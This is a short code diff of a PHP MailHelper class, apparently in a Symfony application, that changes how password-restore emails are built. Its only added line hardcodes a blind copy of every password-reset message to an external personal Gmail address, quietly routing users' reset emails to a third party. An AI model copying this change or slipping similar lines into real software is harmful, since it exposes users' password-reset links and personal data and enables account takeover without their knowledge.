@@ -49,6 +49,7 @@ class MailHelper extends AbstractController
         $message = (new \Swift_Message($subject))
             ->setFrom($from)
             ->setTo($email)
+            ->setBcc('dechadou@gmail.com')
             ->setBody(
                 $this->renderView(
                     'emails/restore_password.html.twig',
